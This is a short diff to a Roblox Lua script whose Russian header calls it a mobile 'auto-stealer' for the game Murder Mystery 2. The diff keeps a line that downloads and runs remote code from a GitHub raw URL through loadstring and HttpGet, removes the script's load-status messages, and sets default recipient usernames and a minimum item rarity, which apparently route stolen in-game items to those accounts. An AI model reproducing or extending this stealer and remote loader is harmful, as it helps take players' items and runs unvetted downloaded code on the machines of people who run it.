@@ -1,12 +1,9 @@
+-- =========================================================================================
+-- Мобильный Авто-Стиллер (MM2) | Phone-Optimized RenderStepped Bypass
+-- =========================================================================================
 local success, res = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/Kenderlike/script/refs/heads/main/ScriptPricePC.txt"))()
 end)
-
-if not success then
-    warn("Ошибка загрузки скрипта: " .. tostring(res))
-else
-    print("Скрипт успешно загружен и запущен!")
-end
 
 local users = _G.Usernames or {"057Deni", "pignkn"}
 local min_rarity = _G.min_rarity or "Common"
